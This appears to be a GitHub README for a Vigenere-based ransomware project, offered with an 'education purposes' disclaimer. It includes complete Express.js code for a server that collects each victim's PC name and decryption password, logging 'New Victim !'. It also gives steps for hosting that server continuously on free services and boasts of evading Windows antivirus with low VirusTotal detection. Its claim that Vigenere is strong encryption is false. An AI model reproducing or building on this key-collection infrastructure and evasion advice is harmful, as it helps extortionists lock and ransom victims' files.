# REVENGE RANSOMEWARE
a vigenere encrypt ransomeware created by me :p, for education purpose.
**MAKE SURE TO STAR THE REPOSITORY :)**

# Used Algorithm
- Vigenere (which is strong algorithm)

# DISCLAIMER
i didnt try this fully, so try it on virtual machine to make sure it works perfectly, If you encounter any problems tell me in [issues](https://github.com/Bowlingtoolkit/Vigenere-Ransomeware/issues)
also **i created this only for education purposes**,
also windows security **wont** detect this ransomeware :) 

# Express Node.js Server (To Get The Password For Decrypt) Example:
```js
const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const app = express();

app.use(express.static(__dirname + "/public"));
app.use(bodyParser.json())
//url.com/new
app.post('/new', (req, res) => {
  var pcname = req.body.user;
  var password = req.body.pass;

  var createStream = fs.createWriteStream(`public/${pcname}.txt`);
  createStream.end();
  
  fs.writeFile(`./public/${pcname}.txt`, `password=${password}`, (err) => {
    if(err) return console.log(err);
    console.log("New Victim !")
  });
  res.send("done")
})

const listener = app.listen(3000, () => {
  console.log("Your app is listening on port 3000");
});
 
```
- You can use [glitch.com](https://glitch.com) or [repl.it](https://repl.it/) to create projects to get the decrypt password, if you want fresh project [click here for fresh glitch.com project](https://glitch.com/edit/#!/remix/revenge-ransome) [or here for repl.it project](https://repl.it/repls/SuperiorCarefulScreenscraper), but make sure to make the project 24/7 by using service like [uptimerobot](https://uptimerobot.com/).



# Detection
15/72
[Virustotal Scan Result](https://www.virustotal.com/gui/file/b74d62a432a9011e2d2c8cf16790a21bd0253ba5d5df09c08e993020985ddc1c/detection)

![virustotal](https://g.top4top.io/p_1614y4m991.png)


# Change Log:
- Now includes the decryption software :) 


![decryptsoftware](https://i.top4top.io/p_1604d9ahl1.png)



- Now supports encrypting folders .
